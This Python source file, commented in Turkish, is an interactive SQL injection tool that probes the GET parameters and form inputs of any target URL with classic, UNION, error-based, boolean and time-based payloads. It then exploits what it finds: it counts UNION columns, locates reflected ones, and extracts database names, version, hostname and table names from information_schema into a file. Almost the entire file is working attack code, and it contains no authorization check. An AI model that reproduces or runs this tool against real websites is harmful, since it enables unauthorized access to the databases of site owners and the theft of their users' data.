import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse,urljoin
import time
import hashlib
from bs4 import BeautifulSoup
from collections import Counter


# SQL Injection Payloadları
payloads = {
    "classic": " AND 1=1 --",
    "union_based": "' UNION SELECT NULL, NULL --",
    "error_based": "' AND CONVERT(int, 'text') --",
    "boolean_blind": "' AND '1'='1 --",
    "time_based": " AND SLEEP(5) #",
}
payloads2 = [
    "' OR '1'='1 --",
    "' AND 1=1 #",
    "' AND 1=2 --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT 1, 'test' --",
    "' AND SLEEP(5) --"
]

# SQL hata mesajları
sql_errors = [
    "sql syntax error",
    "unclosed quotation mark",
    "mysql_fetch",
    "unknown column",
    "you have an error in your sql syntax",
    "odbc",
    "near",
    "unexpected"
]

def detect_request_method(url):
    """URL de parametre var mı ve istek GET mi POST mu anlamaya çalışır."""
    parsed_url = urlparse(url)
    if parsed_url.query:
        return "GET"
    else:
        return "POST"

def analyze_response_get(response, baseline_length, baseline_hash, elapsed_time, payload, attack_type):
    """
    Yanıtı analiz eder ve farklı test kriterlerine göre açıklık tespit eder.
    """
    response_length = len(response.text)
    response_hash = hashlib.md5(response.text.encode()).hexdigest()

    # Yanıt uzunluğu kontrolü
    if response_length != baseline_length:
        print(f"[+] Response length mismatch with {attack_type} payload: {payload}")

    # Yanıt içeriği kontrolü
    if response_hash != baseline_hash:
        print(f"[+] Response content mismatch with {attack_type} payload: {payload}")

    # SQL hata mesajı kontrolü
    if any(error in response.text.lower() for error in sql_errors):
        print(f"[+] SQL error detected with {attack_type} payload: {payload}")

    # Zaman tabanlı saldırı kontrolü
    if attack_type == "time_based" and elapsed_time > 2:
        print(f"[+] Time-based SQL Injection detected with payload: {payload} (Elapsed Time: {elapsed_time:.2f}s)")

def test_union_columns(url):
   
    base_param = " UNION SELECT {} -- "  # Payload formatı
    previous_response = None
    found_columns = None

    # İlk olarak temiz sayfa içeriğini al
    try:
        clean_response = requests.get(url)
        if clean_response.status_code != 200:
            print(f"[!] Clean page no response. HTTP Kod: {clean_response.status_code}")
            return
        clean_html = clean_response.text  # Temiz yanıt
    except requests.exceptions.RequestException as e:
        print(f"[!] Clean page request failed: {e}")
        return

    print("[*] Starting column count testing...")
    for num_columns in range(1, 21):
        # Sütun listesi oluştur
        columns = ",".join(map(str, range(1, num_columns + 1)))
        payload = base_param.format(columns)

        # Payload'ı URL'ye ekle
        full_url = url.rstrip(" ") + payload

        try:
            # HTTP isteği gönder
            response = requests.get(full_url)

            if response.status_code == 200:
                # Sayfa içeriği kontrol ediliyor
                if previous_response and response.text != previous_response:
                    print(f"[+] A different output was detected. Number of columns: {num_columns}")
                    found_columns = num_columns
                    break
                previous_response = response.text
            else:
                print(f"[!] HTTP error with status code {response.status_code} for payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
            return

    if not found_columns:
        print("[!] No different outputs were detected.")
        return

    print(f"[*] Total column number: {found_columns}")

    # Hangi sütunların göründüğünü bul
    print("[*] Testing which columns are reflected on the page...")
    reflected_columns = []

    for i in range(1, found_columns + 1):
        # Test için yalnızca bir sütunu değiştiren payload oluştur
        columns = ["NULL"] * found_columns
        columns[i - 1] = f"'VISIBLE{i}'"
        payload = base_param.format(",".join(columns))

        # Payload'ı URL'ye ekle
        full_url = url.rstrip(" ") + payload

        try:
            # HTTP isteği gönder
            response = requests.get(full_url)

            if response.status_code == 200 and f"VISIBLE{i}" in response.text:
                print(f"[+] Column {i} is reflected on the page.")
                reflected_columns.append(i)
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed during reflection testing: {e}")

    if reflected_columns:
        print(f"[+] Reflected columns: {', '.join(map(str, reflected_columns))}")
    else:
        print("[!] No columns are visibly reflected on the page.")
        return

    # Kullanıcıya veri tabanı bilgileri çekilsin mi sorusu
    user_input = input("[?] Shall the database information be extracted? dbname(n)/db_version(v)/tables(t)/exit(e): ").strip().lower()
    
    if user_input == 'n':
        # Dinamik UNION SELECT Payload oluşturma
        columns_for_payload = ['NULL'] * found_columns
        
        for i in reflected_columns:
            columns_for_payload[i - 1] = f"schema_name"  # Dinamik olarak schema_name ekleniyor
        
        # SQL payload: information_schema.schemata tablosundan veriler çekiliyor
        payload_for_db_info = " UNION SELECT " + ",".join(columns_for_payload) + " FROM information_schema.schemata -- "
        full_url_with_payload = url.rstrip(" ") + payload_for_db_info

        try:
            # Payload'ı gönder ve yanıtı göster
            response = requests.get(full_url_with_payload)

            if response.status_code == 200:
                payload_html = response.text  # Payload sonrası HTML
                print("[*] Differences are detected after the payload...")
                
                # HTML'leri BeautifulSoup ile karşılaştır
                clean_soup = BeautifulSoup(clean_html, 'html.parser')
                payload_soup = BeautifulSoup(payload_html, 'html.parser')

                # Body içeriğini karşılaştır
                clean_body = clean_soup.find('body')
                payload_body = payload_soup.find('body')

                # Farklılıkları belirle
                differences = []
                if clean_body and payload_body:
                    for elem in payload_body.find_all(True):  # Tüm elemanları dolaş
                        if str(elem) not in str(clean_body):  # Sadece farkları al
                            differences.append(elem.get_text(strip=True))
                else:
                    print("[!] Body content could not be compared.")

                # Kullanıcıya farkları göster
                if differences:
                    print("[*] Differences after payload:")
                    for idx, diff in enumerate(differences, 1):
                        print(f"  {idx}. {diff}")
                else:
                    print("[!] No differences were detected.")
                
                # Satırlardaki tekrarları analiz et
                line_counts = Counter(differences)

                # En çok tekrar eden satırları al
                repeated_diff = [line for line, count in line_counts.items() if count >= 2]  # Eşik 2 veya daha fazla

                if repeated_diff:
                    print("[*] Possible database names or interesting repeating lines:")
                    for line in repeated_diff:
                        print(f"  - {line}")
                else:
                    print("[!] Repeating line not found.")
            else:
                print(f"[!] HTTP error with status code {response.status_code} for the database query.")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed during database info query: {e}")
    elif user_input == 'v':
    # Dinamik UNION SELECT Payload oluşturma
        columns_for_payload = ['NULL'] * found_columns

        for idx, col_index in enumerate(reflected_columns):
            if idx % 2 == 0:  # Sırasıyla @@version ve @@hostname ekleniyor
                columns_for_payload[col_index - 1] = "@@version"
            else:
                columns_for_payload[col_index - 1] = "@@hostname"
        
        # UNION SELECT ile dinamik payload
        payload_for_db_info = " UNION SELECT " + ",".join(columns_for_payload) + " -- "
        full_url_with_payload = url.rstrip(" ") + payload_for_db_info

        try:
            # Payload'ı gönder ve yanıtı göster
            response = requests.get(full_url_with_payload)

            if response.status_code == 200:
                payload_html = response.text  # Payload sonrası HTML
                print("[*] Differences are detected after the payload...")

                # HTML'leri BeautifulSoup ile karşılaştır
                clean_soup = BeautifulSoup(clean_html, 'html.parser')
                payload_soup = BeautifulSoup(payload_html, 'html.parser')

                # Body içeriğini karşılaştır
                clean_body = clean_soup.find('body')
                payload_body = payload_soup.find('body')

                # Farklılıkları belirle
                differences = []
                if clean_body and payload_body:
                    for elem in payload_body.find_all(True):  # Tüm elemanları dolaş
                        if str(elem) not in str(clean_body):  # Sadece farkları al
                            differences.append(elem.get_text(strip=True))
                else:
                    print("[!]  Body content could not be compared.")

                # Kullanıcıya farkları göster
                if differences:
                    print("[*] Differences after payload:")
                    for idx, diff in enumerate(differences, 1):
                        print(f"  {idx}. {diff}")
                else:
                    print("[!] No differences were detected.")
                
                # Satırlardaki tekrarları analiz et
                line_counts = Counter(differences)

                # En çok tekrar eden satırları al
                repeated_diff = [line for line, count in line_counts.items() if count >= 2]  # Eşik 2 veya daha fazla

                if repeated_diff:
                    print("[*] Possible database version, hostname can be here or at the top:")
                    for line in repeated_diff:
                        print(f"  - {line}")
                else:
                    print("[!] Repeating line not found.")
            else:
                print(f"[!] HTTP error with status code {response.status_code} for the database query.")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed during database info query: {e}")
    elif user_input == 't':
        # Dinamik UNION SELECT Payload oluşturma
        columns_for_payload = ['NULL'] * found_columns
        
        for i in reflected_columns:
            columns_for_payload[i - 1] = f"table_name"  # Dinamik olarak schema_name ekleniyor
        
        # SQL payload: information_schema.tables tablosundan veriler çekiliyor
        payload_for_db_info = " UNION SELECT " + ",".join(columns_for_payload) + " FROM information_schema.tables -- "
        full_url_with_payload = url.rstrip(" ") + payload_for_db_info

        try:
            # Payload'ı gönder ve yanıtı göster
            response = requests.get(full_url_with_payload)

            if response.status_code == 200:
                payload_html = response.text  # Payload sonrası HTML
                print("[*] Differences are detected after the payload...")
                
                # HTML'leri BeautifulSoup ile karşılaştır
                clean_soup = BeautifulSoup(clean_html, 'html.parser')
                payload_soup = BeautifulSoup(payload_html, 'html.parser')

                # Body içeriğini karşılaştır
                clean_body = clean_soup.find('body')
                payload_body = payload_soup.find('body')

                # Farklılıkları belirle
                differences = []
                if clean_body and payload_body:
                    for elem in payload_body.find_all(True):  # Tüm elemanları dolaş
                        if str(elem) not in str(clean_body):  # Sadece farkları al
                            differences.append(elem.get_text(strip=True))
                else:
                    print("[!] Body content could not be compared.")

                # Tablo adlarını işleme
                if differences:
                    print("[*] Table names detected:")
                    unique_tables = sorted(set(differences))  # Benzersiz tablo adlarını al ve sırala

                    # Kullanıcıya tablo adlarını daha okunabilir sunma
                    max_display = 20  # Gösterilecek maksimum tablo sayısı
                    for idx, table in enumerate(unique_tables[:max_display], 1):
                        print(f"  {idx}. {table}")

                    if len(unique_tables) > max_display:
                        print(f"[!] Toplam {len(unique_tables)} table found Would you like to see the full list? (y/n)")
                        user_choice = input("> ").strip().lower()
                        if user_choice == 'y':
                            print("\n".join(unique_tables))
                        else:
                            print("[!] Not all table names are shown.")

                    # Tablo adlarını bir dosyaya kaydetme
                    with open("tables_output.txt", "w") as file:
                        file.write("\n".join(unique_tables))
                    print("[*] All table names were saved in the file ‘tables_output.txt’.")
                else:
                    print("[!] No table names were detected.")
                
            else:
                print(f"[!] HTTP error with status code {response.status_code} for the database query.")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed during database info query: {e}")

    elif user_input=='e':
        print("[*] Exiting...")
        return
    else:
        print("[!] Invalid entry, terminating transaction.")
        return
def test_get_request(url, payloads):
    """GET isteği için SQL Injection testi."""
    parsed_url = urlparse(url) #Biileşenlere ayırır
    params = parse_qs(parsed_url.query) #Query string i sözlük olarak ayrıştırır
    baseline_response = requests.get(url, timeout=15)
    baseline_length = len(baseline_response.text)
    baseline_hash = hashlib.md5(baseline_response.text.encode()).hexdigest()

    for param in params:
        print(f"\n[INFO] Testing GET parameter: {param}")
        original_value = params[param][0]  # Kullanıcının orijinal girdisi alınır.
        for attack_type, payload in payloads.items():
            # Kullanıcının girdisinin ardından payload eklenir.
            params[param] = original_value + payload
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed_url._replace(query=new_query))

            print(f"[INFO] Trying {attack_type} payload: {payload}")
            try:
                start_time = time.time()
                response = requests.get(new_url, timeout=15)
                elapsed_time = time.time() - start_time

                analyze_response_get(response, baseline_length, baseline_hash, elapsed_time, payload, attack_type)
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Request failed: {e}")

     # Kullanıcıya veri tabanı bilgileri çekilsin mi sorusu
    user_input = input("[?] Should UNION queries work? yes(y)/no(n): ").strip().lower()
    
    if user_input == 'y':
        test_union_columns(url)
    else:
        print("[!] Invalid input, terminating transaction.")
        return    
def extract_form_details(url):
    #Bir sayfadaki tüm formları ve name değerlerini çıkarır.
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    form_details = []

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        input_details = [{"name": input_tag.get("name"), "type": input_tag.get("type", "text")} for input_tag in inputs]
        form_details.append({
            "action": urljoin(url, action),
            "method": method,
            "inputs": input_details
        })

    return form_details

def test_sql_injection_post(form, payload, base_url):
    """Bir form üzerinde SQL Injection testlerini yürütür."""
    url = form["action"]
    method = form["method"]
    inputs = form["inputs"]

    for input_detail in inputs:
        name = input_detail.get("name")
        if not name:
            continue

        print(f"[INFO] Testing input: {name} with payload: {payload}")

        # Veri oluştur
        data = {i["name"]: "test" for i in inputs if i["name"]}
        data[name] = payload  # Payload'u hedef input'a ekle

        try:
            # İstek gönder
            if method == "post":
                response = requests.post(url, data=data)
            else:
                response = requests.get(url, params=data)

            # Yanıtı analiz et
            analyze_response_post(response, payload)
        except requests.RequestException as e:
            print(f"[ERROR] Request failed: {e}")

def analyze_response_post(response, payload):
    """Sunucunun yanıtını analiz eder."""
    if any(error in response.text.lower() for error in sql_errors):
        print(f"[ALERT] SQL Injection detected with payload: {payload}")
    elif response.status_code in (301, 302):
        print(f"[INFO] Redirection detected, possibly SQL Injection with payload: {payload}")
    else:
        print(f"[INFO] No issues detected with payload: {payload}")

def test_post_request(target_url,payload):
    
    print("[INFO] Extracting form details...")
    forms = extract_form_details(target_url)

    if not forms:
        print("[ERROR] No forms found on the page.")
        return

    print(f"[INFO] Found {len(forms)} form(s).")
    
    # Form detaylarını listele ve kullanıcıdan seçim yapmasını iste
    for i, form in enumerate(forms):
        print(f"\nForm {i + 1}:")
        print(f"Action: {form['action']}")
        print(f"Method: {form['method']}")
        print("Inputs:")
        for input_detail in form["inputs"]:
            print(f"  - {input_detail['name']} ({input_detail['type']})")

    while True:
        try:
            selected_form_index = int(input(f"\nSelect a form to test (1-{len(forms)}): ")) - 1
            if 0 <= selected_form_index < len(forms):
                break
            else:
                print("[ERROR] Invalid selection. Try again.")
        except ValueError:
            print("[ERROR] Please enter a valid number.")

    selected_form = forms[selected_form_index]

    print(f"\n[INFO] Testing Form {selected_form_index + 1}:")
    print(f"Action: {selected_form['action']}")
    print(f"Method: {selected_form['method']}")

    for payload in payloads2:
        test_sql_injection_post(selected_form, payload, target_url)

def start_sqli():
    target_url = input("Enter the target URL (e.g., http://example.com/page?id=1): ")
    request_method = detect_request_method(target_url)
    print(f"[INFO] Detected request method: {request_method}")

    if request_method == "GET":
        test_get_request(target_url, payloads)
    elif request_method == "POST":
        test_post_request(target_url,payloads2)
    else:
        print("[ERROR] Could not determine request method.")
